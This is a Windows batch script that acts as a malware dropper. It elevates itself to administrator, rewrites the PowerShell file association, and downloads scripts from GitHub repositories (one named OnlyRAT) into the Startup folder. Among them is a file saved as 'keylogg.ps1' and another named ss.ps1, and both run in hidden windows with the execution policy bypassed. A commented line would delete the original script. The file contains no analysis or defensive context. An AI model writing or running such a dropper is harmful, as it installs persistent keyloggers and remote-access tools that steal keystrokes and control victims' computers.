@echo off

>nul 2>&1 "%SystemRoot%\system32\cacls.exe" "%SystemRoot%\system32\config\system"

if '%errorlevel%' NEQ '0' (
    echo Requesting administrative privileges...
    powershell -Command "Start-Process '%0' -Verb RunAs"
    exit
)

set "initialPath=%cd%"
set "startup=%AppData%\Microsoft\Windows\Start Menu\Programs\Startup"

cd /d "%startup%"

assoc .ps1=Microsoft.PowerShellScript.1
ftype Microsoft.PowerShellScript.1="%SystemRoot%\system32\WindowsPowerShell\v1.0\powershell.exe" "%1"

powershell -c "(New-Object System.Net.WebClient).DownloadFile('https://raw.githubusercontent.com/Sayuru99/OnlyRAT/main/resources/admin/admin.bat', '%startup%\admin.bat')"
powershell -c "Start-Process cmd.exe -ArgumentList '/c \"%startup%\admin.bat\"' -Verb RunAs"

echo powershell -c "Invoke-WebRequest -Uri 'https://github.com/lak200425/dododo/blob/daf08c77b8bb7f83a190398f48f1745d0f65f13c/key.ps1' -OutFile 'keylogg.ps1'; Start-Process powershell.exe -ArgumentList '-ExecutionPolicy Bypass -File \"%startup%\keylogg.ps1\"' -WindowStyle Hidden" > down.cmd
powershell -Command "Start-Process cmd.exe -ArgumentList '/c \"%startup%\down.cmd\"' -WindowStyle Hidden"

powershell -c "(New-Object System.Net.WebClient).DownloadFile('https://github.com/lak200425/dododo/blob/daf08c77b8bb7f83a190398f48f1745d0f65f13c/ss.ps1', '%startup%\ss.ps1')"
powershell -Command "Start-Process powershell.exe -ArgumentList '-ExecutionPolicy Bypass -File \"%startup%\ss.ps1\"' -WindowStyle Hidden"

cd /d "%initialPath%"

REM del initial.cmd